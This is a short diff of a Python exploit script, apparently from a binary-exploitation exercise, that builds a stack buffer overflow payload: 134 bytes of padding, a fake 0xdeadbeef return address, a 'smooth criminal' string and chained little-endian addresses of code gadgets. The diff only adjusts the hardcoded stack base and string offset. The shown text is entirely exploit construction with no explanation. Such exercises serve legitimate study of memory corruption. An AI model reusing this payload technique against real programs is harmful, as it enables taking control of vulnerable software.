@@ -6,9 +6,11 @@ oflow = b'A' * 134
 string = b"smooth criminal\0"
 fakeret = b'\xef\xbe\xad\xde'
 
-stack_base=0xffffd76c
+#stack_base=0xffffd76c
+#stack_base=0x080488f3
+stack_base=0xffffd810
 
-string_addr = stack_base + 0x1c
+string_addr = stack_base + 0x18
 frames = [
         [ b'\xab\x88\x04\x08', b'\xf1\x88\x04\x08', b'\x02\x00\x00\x00', string_addr.to_bytes(4, byteorder='little') ],
         [ b'\xe3\xd0\x06\x08', fakeret, b'\x00\x00\x00\x00' ]
